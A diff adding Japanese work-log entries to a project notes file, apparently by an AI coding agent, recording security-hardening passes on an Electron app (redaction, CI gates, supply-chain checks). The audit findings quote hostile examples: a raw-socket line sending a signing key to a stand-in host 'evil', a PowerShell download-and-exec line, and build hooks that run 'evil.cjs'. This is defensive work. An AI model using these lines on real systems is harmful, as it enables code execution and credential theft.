@@ -7,6 +7,89 @@
 >
 > 大幅な変更を加えた時は **このファイルも合わせて更新** してください。
 
+## 直近の作業 (2026-10-16) — パス 526: 狩りの 16 回目。5 面の監査役の指摘を自分で再現し、本物の 14 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 526」。T-099〜T-112 (ai: 危機語彙の拡張・検索語の天井 / network: 伏字のエスケープ引用・Ollama 案内コマンドの origin / renderer: CSV の列数・セル数の天井 / main-ipc: 単一インスタンスのロック / supply-chain: electron-builder.env・build/・workspaces・lockfile の対応・force-add・入れ子 eslint 設定・stryker.conf・CODEOWNERS)。
+- 新しい道具: `npm run audit:verify-keep-going` (止まらずに全門を回し、落ちた物を一度に挙げる・`--fast` で約 80 秒)。
+- **所有者の判断待ち (PKG-1)**: 電子ヒューズ `grantFileProtocolExtraPrivileges=false` が `win.loadFile(asar)` を壊す可能性 (最小の再現で `ERR_FILE_NOT_FOUND`)。梱包物では未確認。直す道は 2 つ (ヒューズを戻す / `app://` スキームで origin を移行)。台帳の huntBacklog に実測つきで記録した。
+
+## 直近の作業 (2026-10-16) — パス 525: 狩りの 15 回目。5 面の監査役の指摘を自分で再現し、本物の 11 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 525」。T-088〜T-098 (supply-chain: ビルドが実行するデータ・モジュールを実行前に構文木で検める / ai: 危機語彙・model の形・categories の天井 / renderer: 感情ログの危機の文を送らない・CSV 行数の数え方・音声の線形化 / main-ipc: JSON の資格情報スロット・戦略比較の行検査・書き込み用の読み / network: 伏字の接頭辞と scheme・スキャン先の警告・HIBP の入力の天井)。
+- **確立したパターン** —— 実行する前に「データだけ」と確かめる (実行を避けられない所は、通す形を狭くして落とす)。保護対象を触ったら全件の前に `chain:append`。広い Stryker disable の帯を延ばす編集は帯の外へ出す。
+- 検証: `npm test` 1076 / 21825・`verify:all` exit 0・chain #307・e2e / e2e:lite 758 件・e2e:ollama PASS・両ビルド 11,883,721 B / 3,296,345 B。
+- CI: `3204d27df` は success。
+- **次**: backlog 22 件 (R525-6 / R525-7 / F-3 / AI-6 ほか)。マージはしない (PR #806 に積む)。
+
+## 直近の作業 (2026-10-16) — パス 524: 狩りの 14 回目。5 面の監査役の指摘を自分で再現し、本物の 15 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 524」。T-073〜T-087 (ai: 危機語彙の活用形と飾りの字・村の音声の断り / network: Cloudflare 新接頭辞の伏字・内部ホスト警告 / renderer: ウォッチリスト天井・自動施錠の期限・CSV の行数天井・音声の引用解析・Markdown の画像/リンク中和 / main-ipc: emotions の書き込み鎖・eraseAll 中の書き込み拒否 / supply-chain: vite の設定明示・binding.gyp・workflow・追跡禁止の設定)。
+- **確立したパターン** —— `ACTIONS` は `'鍵': 素の関数名` の形で書く (`invokeDataTypes` が読む)。鎖は関数の中へ。新しい `new URL(` / 生の読み / 内部の census 行は、足した瞬間に census が鳴るので台帳へ。
+- 検証: `npm test` 1074 / 21698・`verify:all` exit 0・chain #305・e2e / e2e:lite 758 件・両ビルド 11,881,725 B / 3,294,349 B。
+- **次**: backlog 18 件 (裸の鍵の伏字・workflow_run の固定ほか)。マージはしない (PR #806 に積む)。
+
+## 直近の作業 (2026-10-15) — パス 523: 狩りの 13 回目。5 面の監査役の指摘を自分で再現し、本物の 14 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 523」。直したのは T-059 (network: Worker とアプリの上流 URL の userinfo / 既定外ポート —— backlog NET-6 の前提が偽だった) / T-060〜T-062 (main-ipc: 書き出し先は正規化済みの絶対パスだけ・読めない保管ファイルの上に書かない・OAuth の待受を迷い要求で閉じない) / T-063〜T-065・T-067 (renderer: changePassword / recover / initialize の施錠の世代・初期化の `add`・StatusBar の失敗文の畳み・計画と実行の関門の順序) / T-066 (network: 204 / 205 / 304 の封筒) / T-068・T-069 (ai: 直前の危機の文を履歴として送らない・村の相談の返答を上書きしない) / T-070〜T-072 (supply-chain: builder 設定の影・公開する assets を鎖へ・PostCSS の設定の探索を止める) の 14 件。
+- **確立したパターン** —— **調べた物と書く物を同じ文字列にする** (resolve した後で判定して生の綴りで書くと、`..` が検査を通る)。**「無い」と「在るのに読めない」は別の答え** (null に畳むと次の保存が上書きする)。**世代は最初の `await` より前** —— `openDb` の後ろでは窓を見落とす (recover の最初の await は `decodeMnemonic`)。**存在の判定と書き込みは 1 つの取引で** (`add` は鍵が在れば abort する)。**危機の文は最新の発話だけでなく履歴からも外す**。**設定を探す道具 (builder / PostCSS) は名指しで止める** —— 探索の順序は攻撃者の綴りが先に来る。**公開する物は全部鎖へ** (icon も)。
+- **既知の罠 (このパスで踏んだ)**: `getToken` は施錠中は null ではなく投げる (検査の期待を直した)。vault の `add` の ConstraintError は要求の error に乗り `tx.error` はまだ空。半分だけ消して再初期化する古い fixture は `add` で落ちる (master-wrap も消す)。対照の計数器を `globalThis` の未定義で書くと NaN で鳴らない (「鳴らなかった」と「当てていなかった」は別)。vite の `css.postcss` は電子側の束ね (別の設定) には効かない。
+- 次に読む人へ: 残る backlog は 14 件 (`huntBacklog`) —— 設計判断 9 件 (C1〜C5 / MAIN-1 / MAIN-2 / C1 の連鎖 / AI-6)・MAIN-3 / MAIN-4・network の強める候補 2 件 (N-3 / N-5)・所有者の判断 1 件 (F-1)。全件・実機とも緑 (e2e 758 / e2e:lite 758 / ollama PASS / perf OK・npm test 21612 件・chain 305 ブロック)
+
+## 直近の作業 (2026-10-15) — パス 522: 狩りの 12 回目。5 面の監査役の指摘を自分で再現し、本物の 13 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 522」。直したのは T-046 / T-047 (network: Worker と CI の関門の SIIT 形・Discord webhook の伏字) / T-048〜T-051 (renderer: 復元の id 衝突・解錠中の施錠の上書き・台帳に無い collection の記録・aria-label の天井) / T-052 / T-053 (ai: 危機語の畳み込み・ollama の content の型) / T-054 / T-055 (main-ipc: assistant スロットの JSON・状態ファイルの書き込みの鎖と一意な tmp) / T-056〜T-058 (supply-chain: persist-credentials・actions/* の SHA 固定・残る workflow と dependabot を鎖へ) の 13 件。
+- **確立したパターン** —— **「読む → 直す → 書く」は鎖に並べ、作業ファイルは一意な名前にする** (`main/writeChain.ts` · `atomicTmpPathOf`)。**照合の畳み込みは両側に掛ける** (text だけ畳むとカタカナのマーカーが永久に当たらない)。**世代は最初の `await` より前に控える** (解錠を頼んだ後に届いた施錠はどれも解錠より新しい意思)。**`actions/*` も不変ではない** (major タグは動く —— `git ls-remote` の SHA で固定し、版は注記に残す)。**知らない物は「困るかもしれない」側へ倒す** (台帳に無い collection を個人情報ではないと数えない)。
+- **既知の罠 (このパスで踏んだ)**: `async` を外して鎖へ委ねると、入口の検証の throw が**同期の例外**になり `rejects.toThrow` の検査が落ちる (鎖へ委ねる関数も `async` のまま)。固定名の `.tmp` を留めていた検査 3 件は**一意な名前の形**へ (`toMatch(/\.tmp-\d+-\d+-[0-9a-f]+$/)`)。workflow を鎖へ入れると **`run:` の閉包**が鳴る (4 本 + 2 本を続けて足した)。
+- **末尾 (2026-10-15) —— 変異検査の生存を閉じた**: push 後に測った 9 本のうち 6 本が break を割った (secrets 95.18% / store 98.24% / backup 98.92% / stocks 99.86% / vault 99.78% / recordShapeAudit 未到達 2)。**報告の JSON は `audit:mutate-changed` が片付けて残らないので、secrets の 12 件は手で当て直した —— 12 件とも本物** (perTest の帰属ずれではない)。等価 4 件は形ごと消し (`'utf8'` の既定・`lockToken` の同一性・`withinRecordDepth` は器しか積まない・`RestoreEnvelope.collection` を必須に)、本物の穴 13 件は検査 9 件 + 既存 2 件の主張を強めて閉じた (writeStore の境界を 2 鍵でちょうど 1 MiB に作る・T-031 の書き戻し 3 枝・マージの `put` / `get` が投げる 2 形 ほか)。対照 18 方向すべて鳴る。測り直し: **6 本とも 100.00%** (store.ts は未到達 1 を検査で閉じてから 100.00%)。block #301・両ビルド −30 B / −14 B・実機 758 / 758 / ollama / perf 緑・`npm test` 21,581 件・`verify:all` exit 0・`c5c2f443a` の CI success。詳細は `docs/REMAINING_WORK.md` の「変異検査の生存を閉じた (パス 522 の末尾)」。
+- 次に読む人へ: 残る backlog は 14 件 (`huntBacklog`) —— 設計判断 8 件 (C1〜C5 / MAIN-1 / MAIN-2 / C1 の連鎖)・MAIN-3 / MAIN-4・network の強める候補 3 件 (N-3 / N-5 / NET-6)・**所有者の判断 1 件 (F-1: main の branch protection)**。全件 `typecheck` 緑・`npm test` **1069 ファイル / 21,572 件** (1 度目は 3 件落ちた —— どれも台帳の帳尻: `absenceSampleCensus` の行番号の鍵 (3696 → 3698) と `originalSourcePolicy` の「道が読めない生の読み」2 本 (新しい検査が一時ディレクトリと `.github/workflows/` の一覧を読む)。理由つきで台帳へ入れた)・`verify:all` exit 0 (`verify:arch` のユニット数 17732 → **17767**・stocks の ACTIONS の引用と `getValidToken` の行が動いた —— 予想せず門に訊いた。`lint:mutation-scope` は stocks.ts の広い `Stryker disable` が 30 → 40 行に伸びたと鳴り、保存の側を帯の外へ出した —— 新しい race の検査が実ファイルで既定の lambda を通すので、そこの変異体は殺せる)・`chain:verify` 緑 (block **#297〜#300**・保護対象 105 → **115**)・`lint:zero-fold` の census を再生成 (106 / 271 → 107 / 273 —— `backup.ts` の `unknownCounts.get(c) ?? 0` と点検パネルの `: 0`)。変異検査: `redact.ts` **100.00% (132 変異体)**。実機 (`e2e.yml` の順序・最終コード): `e2e` **758 件 ❌ 0**・`e2e:lite` **758 件 ❌ 0**・`e2e:ollama` ALL PASSED (main の ollama.ts を触ったので回した)・`perf` OK (LITE DCL 226 ms / heap 9.7 MB・FULL DCL 620 ms / heap 36.4 MB)。出荷物: FULL **11,878,266 B** (md5 `650a7961…`) / LITE **3,290,890 B** (md5 `cea7cfad…`) —— パス 521 後 (11,875,986 B / 3,288,610 B) から**両方 +2,280 B** (危機語の畳み込み・解錠の世代・復元の id 衝突と台帳に無い collection の扱い・点検パネルの節。`renderer/` は両ビルドが読むので同じだけ)。
+
+## 直近の作業 (2026-10-14) — パス 521: 狩りの 11 回目。5 面の監査役の指摘を自分で再現し、本物の 4 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 521」。直したのは T-042 (書き出し先の親を根と `templates/` の 2 つに固定 —— 既定名をディレクトリに化けさせない) / T-043 (`npm run build` の綴りと `package.json` に `build` 鍵が無いことを留める —— electron-builder は `package.json.build` を先に読む) / T-044 (復元の `put()` が投げたら取引ごと `abort()`・記録の深さを 32 で切る —— 深さ 1 万の記録 1 件で置換復元が `clear()` だけを commit していた) / T-045 (invoke の失敗本文を画面へ出す 50 か所を `externalTextOnOneLine` で畳む・census で双方向に留める) の 4 件。network は確認できた欠陥 0 で、強める候補 4 件 (N-1 / N-2 / N-3 / N-5) を実測つきで `huntBacklog` へ。
+- **確立したパターン** —— **IndexedDB の `put()` は同期で投げうるので、`clear()` と並べる取引は `try / abort` で囲む** (投げると `txDone` に届かず自動 commit)。**計画 (planRestore) と実行 (importAll) が同じ門を読んでいても、門が見ない軸 (深さ) で実行が投げれば割れる** —— 実行が投げうる軸は門にも要る。**畳む関数が在ることと、全部の出口が通っていることは別** —— T-005 / T-020 / T-025 は経路を 1 本ずつ畳んでおり、同じ `message` の出口を面の側から数えたら 50 か所残っていた。
+- 次に読む人へ: 残る backlog は 12 件 (`huntBacklog`) —— 設計判断 8 件 (C1〜C5 / MAIN-1 / MAIN-2 / C1 の連鎖) と network の強める候補 4 件。全件 `npm test` **1069 ファイル / 21,572 件すべて緑** (exit 0・ログへ落として読んだ)・`verify:all` exit 0 (`verify:arch` のユニット数 17717 → **17732** —— 予想せず門に訊いた。1 度目は `lint:charset` が私の検査 2 本の**生の U+202E / U+200B 6 か所**を鳴らした —— パス 519 と同じ罠で、`\uXXXX` の綴りへ直した)・実機 (`e2e.yml` の順序・最終コード): `e2e` **758 件 ❌ 0**・`e2e:lite` **758 件 ❌ 0**・`e2e:ollama` ALL PASSED (OllamaPage の出口も畳んだので回した)・`perf` OK (LITE DCL 243 ms / heap 9.7 MB・FULL DCL 721 ms / heap 36.4 MB)。PR #806 の本文は 更新済み。 `018816f15` の CI `ci (typecheck + verify + lint + test + build)` は **success** (2026-10-14)。
+
+## 直近の作業 (2026-10-14) — パス 520: 狩りの 10 回目。backlog の残り 9 件を自分で測り、本物の 4 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 520」。直したのは T-038 (`release.yml` の Build から使わない `GH_TOKEN` を外す) / T-039 (`pages.yml` を build + deploy に分け、書く権限は deploy だけ —— 門に `JOB_PERMISSIONS_ALLOW` の台帳と parser を足した) / T-040 (`verify:all` の門の本体が `scripts/` の実在する `.cjs` を指すことを留める) / T-041 (Linux の `basic_text` を「OS キーチェーン」と名乗らない —— `src/main/keychainBackend.ts` の `realKeychainAvailable` を書く側と名乗る側が通す・読む側は通さない) の 4 件。MAIN-6 / MAIN-7 / SUP-2 / AI 3 / AI 5 は測って欠陥ではなかった (clearedBacklog)。
+- **確立したパターン** —— **門が文面で呼ぶ台帳は、実在しなければ「一律に落とす門」である**: `lint:workflow-security` は 2026-08-26 から `JOB_PERMISSIONS_ALLOW` を名指ししながら持っておらず、正しい形 (job を分ける) を取れないので `pages.yml` は広い方へ逃げていた。**`isEncryptionAvailable` は「API が使えるか」であって「鍵が守られているか」ではない** —— Linux の `basic_text` は true を返す。名乗る側は `getSelectedStorageBackend` まで訊く。**書く側・名乗る側と読む側は別の述語を通してよい** (既存の値を消して見せないため)。
+- 次に読む人へ: 残る backlog は 8 件 (`huntBacklog`) で、どれも設計判断 (C1〜C5 / MAIN-1 / MAIN-2 / C1 の連鎖) —— 利用者に確認すること。全件 `npm test` は census 1 本を直して緑 (21,496 件)・`verify:all` exit 0・出荷物は両方ともパス 519 と byte / md5 同一なので実機は回していない。`b6fea55f7` の CI は success。PR #806 の本文は更新済み。
+
+## 直近の作業 (2026-10-14) — パス 519: 狩りの 9 回目。backlog の未確認 7 件を自分で測り、本物の 5 件を直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 519」。直したのは T-033 (単一ラベルの名前を private 判定へ) / T-034 (書き込みの確認が見えない字を見える綴りへ逃がす) / T-035 (`release.yml` の `action-gh-release` を SHA 固定・未固定の台帳が空に) / T-036 (`.claude/settings.local.json` と `.mcp.json` を gitignore) / T-037 (`analyze-text` の `source` に型と天井) の 5 件。MAIN-5 / AI 4 は測って欠陥ではなかった (clearedBacklog)。C4 は再現したが C1 の設計判断に依る。
+- **確立したパターン** —— **台帳の「塞がっている」は、何が塞がっているかを書く**: SUP-3 の台帳は REST の 3 通りだけ試して「このセッションから解決できない・試し直さないこと」と書き、git プロキシの `ls-remote` を 2 か月誰も試さなかった。**見えない字を扱う検査は、その字を綴り (`\uXXXX`) で書く** —— heredoc で書くと実体で入り、`lint:charset` が (正しく) 鳴る。**「見せた物」の口 (確認・抜粋・札) は、型・天井に加えて見えない字も検める** —— `displayField` は天井の口であって逃がしの口ではない。
+- 次に読む人へ: C1 / C4 の設計判断 (保存値を保管庫へ / 送り先の変更を利用者に確認させる) を利用者に確認すること。残る backlog は 17 件 (`huntBacklog`)。実機・全件 `npm test` の結果は 全件 `npm test` は census 3 本を直して (`c201548ae`) CI success・実機は 758 / 758 件 ❌ 0・e2e:ollama・perf OK (FULL 11,875,465 B / LITE 3,288,089 B)。PR #806 の本文は更新済み。。
+
+## 直近の作業 (2026-10-14) — パス 518: 狩りの 8 回目。監査役の指摘を再現し、本物だけ直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 518」。直したのは T-028 (部分消去の断り) / T-029 (村の危機→AI) / T-030 (SIIT 判定) / T-031 (更新の書き戻しの比較) の 4 件で、T-032 は受容。C1 (file:// の生成元共有) は独立に再現したが設計判断が要るため backlog。
+- CI: `verify:arch` 赤 → `95080f9bb`、census 赤 → `cd18195a6` で直し、`cd18195a6` の CI は success。実機は 758 件 ALL PASSED・e2e:ollama・perf OK。
+- 次に読む人へ: C1 の設計判断 (`huntBacklog` の C1) を利用者に確認すること。PR #806 の本文はまだ更新していない。
+
+## 直近の作業 (2026-10-13) — パス 517: 狩りの 7 回目。5 面を監査役に並行で走らせ、確認した本物だけ直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 517」。監査役 (read-only・inherit/high) を 5 面に並行で走らせ、**各指摘を自分で再現してから**本物だけ直した (監査役の報告は権威を持たない)。**6 件が本物**。F6 (コンシェルジュの成功返答偽装) は再現すると clearedBacklog #4 と同一 (当日「穴なし・fold しない」と測定済み) だったので再 backlog せず。
+- **直した 6 件**:
+  - **T-022 (renderer → ai-phishing・low)** —— 財務レポート (.md) の表題 `# 財務分析レポート — ${label}` が利用者の事業名を素で載せ、`<img onerror>` や改行 + `## 偽の見出し` で Markdown 構造を注入できた (ダウンロードして人に渡る文書)。`markdownExportCensus` は financialReport を `freeText: 'none'`「利用者の文は通らない」と**偽**分類していた (`label` がまさに利用者の文)。直し: `escapeMarkdownInline(label)`・census を `escaped` へ移し `importsEscaper` で機械検証・件数 `{escaped:3,none:2}`。回帰 `financialReport.test.ts` (T-022)。
+  - **T-023 (main-ipc → living-off-the-land・low)** —— `eraseAll.ts` の `eraseFileAndLitter` が `io.rm` を**非 recursive**で呼び、`secrets.json` / `.prev` / litter がディレクトリに化けていると `EISDIR` で投げてワイプが途中で止まり秘密が残った (本物の fs で再現)。直し: 3 つを `{ recursive: true }` へ (**force は付けない** —— ENOENT を飲むと missing/deleted の区別 (パス 134) が壊れる)。回帰 `eraseAll.test.ts` (T-023)。
+  - **T-024 (supply-chain・low)** —— `lint:deps` の lifecycle フック検出が install 系の綴りだけを数え、`"postbuild":"node evil.cjs"` (= `npm run build` で任意コード) が無防備だった。直し: `lifecycleHooksPresent` が scripts の全キーを走査し base が script なら pre/post を present に足す。危ない postbuild→release は T-016 (medium) が別に持つ。回帰 `installTimeCodeGuarded.test.ts` (T-024)。
+  - **T-025 (renderer → ai-phishing・low)** —— 村ページ `VillagePage` の AI エラー `setAiError(res.message)` / `setAiError(String(e))` が第三者の失敗本文を `externalTextOnOneLine` で畳まず、改行・双方向制御 (Trojan Source · U+202E)・不可視字が生で出た。AI の失敗を描く最後の経路で畳んでいない唯一の所 (AssistantPage・bestAnswers・コンシェルジュの T-005/T-020 は畳んでいた)。直し: 動的な setAiError 2 か所を `externalTextOnOneLine` で包む。回帰 `villageAiErrorFold.test.ts` (T-025・走査 census + choke point + 対照)。
+  - **T-026 (supply-chain・low)** —— `lint:deps` が `stryker.config.json` の「コードを選ぶ欄」(`plugins`/`testRunner`/`reporters`/`checkers`) のローカルパスを検めず、`plugins:["./evil.cjs"]` で週次の mutation CI に任意コードを通せた (config-picks-code)。直し: `checkStrykerCodePicking` が specFields にローカル指定子・`buildCommand`/`commandRunner` が無いことを検める。回帰 `installTimeCodeGuarded.test.ts` (T-026)。
+  - **T-027 (network → ssrf-and-credential-egress・medium)** —— `lint:network-targets` の src 外の網の口が `fetch`/`https.request` の綴りだけを見て、生のソケット (`net.connect` / `tls.connect` / `dgram.createSocket` / `http2.connect`) を漏らした。`tools/collect.cjs` に `require('net').connect(443,'evil').end(fs.readFileSync(鍵))` を置くと 4 つの egress 門をすべて素通りした (CI の署名鍵を持ち出せる)。直し: `OUTSIDE_RAW_SOCKET` 正規表現を足し `outsideSendFindings` の loop へ (文字列は `''` に潰れるので `require('')` の形も鳴る)。real gate exit 0 (偽陽性 0)。回帰 `networkTargetWitness.test.ts` (T-027・証人 8 + self-test 6 + 対照)。
+- **確立したパターン** —— **監査役の報告は権威を持たない。esbuild の束・ゲート関数の直接呼び・本物の fs・母集団の実測で 1 件ずつ再現してから直す。** **第三者の文を画面へ出す最後の経路を 1 つ直したら兄弟を全部数える** (村ページだけ畳んでいなかった)。**門の走査母集団・列挙は綴りや固定キーで決めず、実物の形 (git ls-files の全木・scripts の全キー・ソケットの呼び方) に聞く。** **破壊的なファイル操作 (ワイプ) は、目標が別の形 (ディレクトリ) に化けても完遂する。**
+- 出荷コードが動いた (`financialReport.ts` / `VillagePage.tsx` renderer・`eraseAll.ts` main) ので実機も回した —— FULL **11,875,116 B** / LITE **3,287,740 B**。`typecheck` 緑・`npm test` exit 0・`verify:all` exit 0 (ユニット数 17647 → **17668**)・`chain:verify` 緑 (block **#291** —— `eraseAll.ts` は保護対象)・perf OK・e2e **758 件 ❌ 0**・e2e:lite **758 件 ❌ 0**。脅威 20 → **26** (T-004 欠番)。PR #806 に積む (マージしない)。
+
+## 直近の作業 (2026-10-13) — パス 516: 狩りの 6 回目。5 面を監査役に並行で走らせ、確認した本物だけ直す
+
+- 詳細は `docs/REMAINING_WORK.md` の「パス 516」。監査役 (read-only・high) の報告は main-ipc / renderer / ai = 0 件 (measured-healthy)、network = 新規 LOW 1 件、supply-chain = 新規 MEDIUM 1 件。**ai 面は監査役の報告待ちの間に自分で ChatbotWidget の invoke 失敗経路を読んで 1 件見つけた**。**再現で 3 件とも本物**だった。
+- **直した 3 件**:
+  - **T-019 (living-off-the-land・medium)** —— 配る実行可能ランチャー `launcher/ServiceHubを開く.bat` (Windows 利用者がダブルクリックして standalone.html を開く) が、全コード走査門・整合性チェーン・CODEOWNERS の**どれにも無かった**。実測 (直す前): `powershell … iwr <url> -OutFile … ; Start-Process …` の download-and-exec を 1 行足すと `lint:malware` / `lint:forbidden` / `lint:shell` / `lint:charset` が **4 門すべて exit 0** (復元 md5 一致)。走査母集団はトップレベル dir の固定 allowlist (`src|scripts|orchestration|build|assets`) で決まるので新しい dir `launcher/` を構造的に見ず (T-016 の家系が dir レベルに残っていた)、`.bat` はどの `SCAN_EXTS` にも無い (T-018 の拡張子死角)。`.bat` は Windows シェルで JS / bash の規則が当たらないので、正しい機構は『黙った編集を可視化 + 所有者レビュー必須』 —— `assets/sw.js` と同じく整合性チェーンの PROTECTED へ (block **#290**)。将来のランチャー (任意 dir・`.bat/.cmd/.ps1/.vbs/.command`) は `launcherExecutablesGuarded.test.ts` が『全部チェーン保護対象』で機械強制 (`.sh` は lint:shell の担当なので除く)。回帰 (T-019)。
+  - **T-020 (ai-phishing・low)** —— コンシェルジュの invoke 失敗の吹き出し (`ChatbotWidget.runIntent:417`) が第三者の失敗本文 (`classified.message`) を `externalTextOnOneLine` で**畳んでいなかった**。吹き出し (`.concierge-msg`) は `white-space: pre-wrap` なので、改行を 1 つ持ち込めば `✅ 実行しました…` のようなアプリの結果そっくりの行を別の行として描ける —— パス 488 (AI アシスタント) / パス 511・T-005 (**同じ吹き出し**の Ollama エラー経路 `chatbotOllama.ts:116`) が塞いだ当の形が、この invoke 失敗の経路**だけ**に残っていた。伏字と長さは choke point (`err()` / `safeErrorMessage`) が掛けるが、実測で**改行は残す**ので足りなかったのは畳みだけ。直し: `externalTextOnOneLine(classified.message)` で畳む。回帰 `chatbotInvokeFailureFold.test.ts` (T-020)・対照: 畳みを外すと `\n` が残り落ちる (確認済)。
+  - **T-021 (ssrf-and-credential-egress・low)** —— `redact.ts` の裸トークン接頭辞一覧に Cursor の Admin API キー (`key_` + 16 進) が無く、JSON エラー本文に**裸で**反射された鍵が伏字を素通りした。実測 (実物の `redactSecrets`): `{"error":"Invalid API key: key_…"}` は素通り・`Bearer key_…` / `{"authorization":…}` は伏せる。census (`redactionCoverage.test.ts`) は cursor を `header-only` に**実形でない標本 `'H'.repeat(40)`** で置き穴を隠していた (パス 231 の『自分の写しを数える』家系の再来)。到達: ブラウザ版の Cursor live-read は BYO proxy 経由で、乗っ取られた Worker が `key_…` を裸で反射すると `fetchViaProxy` の失敗枝が `redactForMessage` 経由で画面とバグ報告へ出す。直し: `\bkey_[0-9a-f]{16,}` を足す —— `key_` は散文に現れる接頭辞なので本体を 16 進に絞り、`[A-Za-z0-9_-]` の一括規則に混ぜない (実測で散文 9 形が素通り)。census を `carrier: prefix`・実形の標本 `key_9f2c1a8e4b7d6c5f0a3e` へ移した。回帰 `redactionCoverage.test.ts` (T-021)・対照: 直す前 PASSTHRU → 直した後 REDACTED (確認済)。
+- **確立したパターン** —— **配る実行可能物 (ランチャー・maker・sw.js) は、追加された時点でチェーン + CODEOWNERS に載せる**。走査門が言語で当てられない物は『可視化 + 所有者レビュー』が正しい機構。**同じ吹き出し / 同じ関門へ第三者の文が来る経路は、1 つ直したら兄弟も数える** (Ollama 経路は畳んでいたのに invoke 経路が残っていた・ヘッダ反射形は伏せていたのに裸形が残っていた)。**伏字の接頭辞一覧の census は、実形の標本で測る** (実形でない標本は穴を隠す)。
+- 出荷コードが動いた (`redact.ts` shared / `ChatbotWidget.tsx` renderer) ので実機も回した —— FULL **11,875,104 B** / LITE **3,287,728 B** (いずれも +3,016 B・パス 507 以降の狩りの累積)。`typecheck` 緑・`npm test` **1057 ファイル / 21346 件**・`verify:all` exit 0 (ユニット数 17638 → **17647**・`redact.ts` の参照 drift を 532-534 → 570-572 へ)・`chain:verify` 緑 (block **#290**)・perf OK・e2e **758 件 ❌ 0**・e2e:lite **758 件 ❌ 0**。脅威 17 → **20** (T-004 欠番)。
+
 ## 直近の作業 (2026-10-13) — パス 515: 狩りの 5 回目。5 面を監査役に並行で走らせ、確認した本物だけ直す
 
 - 詳細は `docs/REMAINING_WORK.md` の「パス 515」。監査役 (read-only・high) の報告は main-ipc / renderer / ai / network = 0 件 (measured-healthy)、supply-chain = 新規 LOW 1 件 + latent な観察 2 件。**再現で確かめると 2 件が本物**だった (3 つ目 `__tests__` 除外は意図的・テストは秘密 env 無しで走るので直さず記録のみ)。
